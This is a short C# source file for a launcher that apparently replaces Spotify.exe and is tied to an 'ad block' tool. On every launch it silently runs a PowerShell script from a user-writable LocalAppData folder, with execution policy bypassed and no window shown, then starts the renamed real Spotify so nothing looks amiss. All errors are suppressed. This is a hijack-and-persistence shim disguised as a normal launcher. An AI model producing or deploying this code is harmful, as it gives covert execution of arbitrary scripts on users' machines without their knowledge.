using System;
using System.Diagnostics;
using System.IO;
using System.Text;

public static class SpotifyLauncher
{
    public static int Main(string[] args)
    {
        try
        {
            string dir = AppDomain.CurrentDomain.BaseDirectory;
            string store = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SpotifyAdBlock");
            string repair = Path.Combine(store, "repair.ps1");

            if (File.Exists(repair))
            {
                var psi = new ProcessStartInfo("powershell.exe",
                    "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + repair + "\"");
                psi.CreateNoWindow = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                psi.UseShellExecute = false;
                Process helper = Process.Start(psi);
                if (helper != null) { helper.WaitForExit(120000); }
            }

            string real = Path.Combine(dir, "Spotify-real.exe");
            if (!File.Exists(real)) { real = Path.Combine(dir, "Spotify.exe"); }

            var sb = new StringBuilder();
            foreach (string a in args)
            {
                sb.Append('"').Append(a.Replace("\"", "\\\"")).Append("\" ");
            }

            var start = new ProcessStartInfo(real, sb.ToString().Trim());
            start.WorkingDirectory = dir;
            start.UseShellExecute = false;
            Process.Start(start);
        }
        catch { }
        return 0;
    }
}
